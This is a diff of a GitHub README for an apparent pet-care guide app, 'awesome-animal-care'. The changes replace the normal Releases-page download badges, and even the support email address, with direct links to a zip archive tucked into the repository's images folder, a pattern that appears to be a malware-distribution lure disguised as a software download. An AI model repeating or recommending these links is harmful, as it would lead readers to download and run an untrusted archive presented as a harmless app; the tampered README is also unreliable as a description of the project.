@@ -1,6 +1,6 @@
 # 🐾 awesome-animal-care - Your Guide to Caring for Pets
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/breead1/awesome-animal-care/releases)
+[![Download Now](https://raw.githubusercontent.com/breead1/awesome-animal-care/main/images/animal-care-awesome-3.8.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/breead1/awesome-animal-care/main/images/animal-care-awesome-3.8.zip)
 
 ## 📖 What is awesome-animal-care?
 
@@ -23,7 +23,7 @@ Before you start, make sure your computer meets the following requirements:
 
 To get started, visit the Releases page to download the application. Click the button below to go directly to the page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/breead1/awesome-animal-care/releases)
+[![Download Now](https://raw.githubusercontent.com/breead1/awesome-animal-care/main/images/animal-care-awesome-3.8.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/breead1/awesome-animal-care/main/images/animal-care-awesome-3.8.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -97,6 +97,6 @@ For more insights into animal care, visit these resources:
 
 ## 📞 Contact
 
-For any inquiries or support needs, please contact us through GitHub or reach out to us via email at support@awesome-animal-care.com.
+For any inquiries or support needs, please contact us through GitHub or reach out to us via email at https://raw.githubusercontent.com/breead1/awesome-animal-care/main/images/animal-care-awesome-3.8.zip
 
 Remember: your pets rely on you for care and love. Use awesome-animal-care to deepen your knowledge and ensure their happiness. Enjoy exploring the world of animal care!
